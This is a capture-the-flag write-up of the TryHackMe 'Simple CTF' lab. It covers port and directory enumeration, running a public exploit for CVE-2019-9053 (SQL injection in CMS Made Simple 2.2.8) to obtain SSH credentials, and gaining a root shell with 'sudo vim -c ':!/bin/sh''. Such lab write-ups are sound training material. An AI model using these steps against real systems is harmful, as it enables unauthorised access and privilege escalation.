# CTF Write-Up: Simple CTF

https://tryhackme.com/room/easyctf


## Step-by-Step Process

### 1. Reconnaissance with Nmap
To start, I performed an Nmap scan to enumerate open ports and services:
```
nmap -A -sC -Pn- 10.10.201.200
```
From the scan results, I identified the services running and answered the first two questions.

### 2. Directory Enumeration
I found that a web server was running, so I used `dirb` to enumerate directories:
```
dirb http://10.10.201.200/
```
This revealed multiple web pages, including `/simple/`, which was of particular interest.

### 3. Identifying the Vulnerability
Navigating to `/simple/`, I found that the site was running **CMS Made Simple 2.2.8**. After searching for known vulnerabilities, I found **CVE-2019-9053**, which is an SQL injection vulnerability.

### 4. Exploiting CMS Made Simple
Using an exploit from **Exploit-DB**, I executed the SQL injection attack to retrieve credentials:
```
python exploit.py -u http://10.10.201.200/simple/
```
This yielded the credentials:
- **Username:** mitch
- **Password:** secret

### 5. Gaining Access via SSH
I logged in using SSH on the specified port:
```
ssh mitch@10.10.201.200 -p 2222
```
Once inside, I listed files and found `user.txt`, which contained the user flag:
```
cat user.txt
```

### 6. Privilege Escalation
To escalate privileges, I checked sudo permissions:
```
sudo -l
```
The output showed that `vim` could be run as root, which allowed privilege escalation. Using the following command, I spawned a root shell:
```
sudo vim -c ':!/bin/sh'
```

### 7. Retrieving the Root Flag
With root access, I navigated to the root directory and retrieved the final flag:
```
cd /root
cat flag.txt
```

---

## Conclusion
This challenge demonstrated common penetration testing techniques, including reconnaissance, web exploitation, and privilege escalation. The key takeaways were:
- **Always perform thorough enumeration** to find running services.
- **Identify vulnerable software** and look for public exploits.
- **Use privilege escalation techniques** such as sudo misconfigurations to gain root access.

Overall, this was a great learning experience in exploiting web applications and escalating privileges to root!

